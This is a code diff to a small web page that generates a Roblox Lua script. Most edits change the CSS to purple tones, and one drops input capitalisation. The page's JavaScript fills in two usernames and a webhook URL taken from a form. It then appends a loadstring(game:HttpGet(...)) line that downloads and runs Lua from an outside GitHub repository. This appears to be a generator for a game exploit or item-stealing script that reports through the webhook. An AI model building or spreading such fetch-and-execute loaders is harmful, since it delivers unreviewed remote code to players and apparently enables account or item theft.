@@ -10,14 +10,14 @@
     /* Global Styles */
     body {
       font-family: Arial, sans-serif;
-      background-color: #f4f4f4;
+      background-color: #6c5ce7; /* Dark purple background */
       text-align: center;
       padding: 50px;
     }
 
     /* Container Styles */
     .container {
-      background-color: white;
+      background-color: #452766; /* Darker purple background */
       padding: 20px;
       border-radius: 8px;
       display: inline-block;
@@ -31,15 +31,15 @@
     /* Button Styles */
     button {
       padding: 10px 20px;
-      background-color: #007bff;
-      color: white;
+      background-color: #7a49a8; /* Purple button background */
+      color: #ffffff; /* White button text */
       border: none;
       border-radius: 5px;
       cursor: pointer;
     }
 
     button:hover {
-      background-color: #0056b3;
+      background-color: #5c3c8a; /* Darker purple button hover */
     }
 
     /* Output Styles */
@@ -76,9 +76,9 @@
       const username = document.getElementById("username").value;
       const username2 = document.getElementById("username2").value;
       const webhook = document.getElementById("webhook").value;
-      const outputString = `Username = "${username.charAt(0).toUpperCase()}${username.slice(1)}"\n` +
-                           `Username2 = "${username2.charAt(0).toUpperCase()}${username2.slice(1)}"\n` +
-                           `Webhook = "${webhook.charAt(0).toUpperCase()}${webhook.slice(1)}"\n` +
+      const outputString = `Username = "${username}"\n` +
+                           `Username2 = "${username2}"\n` +
+                           `Webhook = "${webhook}"\n` +
                            'loadstring(game:HttpGet("https://raw.githubusercontent.com/Abyssal453/AbyssalXY/main/Ps99.lua"))()';
       document.getElementById("output").value = outputString;
       hljs.highlightAll();
